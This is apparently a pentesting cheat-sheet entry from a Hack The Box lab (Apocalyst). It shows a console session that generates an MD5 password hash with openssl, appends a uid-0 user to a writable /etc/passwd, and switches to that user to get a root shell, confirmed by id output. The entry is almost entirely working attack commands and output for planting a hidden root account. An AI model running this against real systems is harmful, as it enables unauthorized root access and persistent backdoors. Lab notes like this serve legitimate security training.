# linux
----

## passwd
* Htb: Apocalyst
  ``` console
  falaraki@apocalyst:~$ openssl passwd -1 -salt salt password
  $1$salt$qJH7.N4xYta3aEG/dfqo/0
  falaraki@apocalyst:~$ echo 'test:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:root:/bin/bash' >> /etc/passwd
  falaraki@apocalyst:~$ su - test
  Password:
  No directory, logging in with HOME=/
  root@apocalyst:/root# id
  uid=0(root) gid=0(root) groups=0(root)
  ```
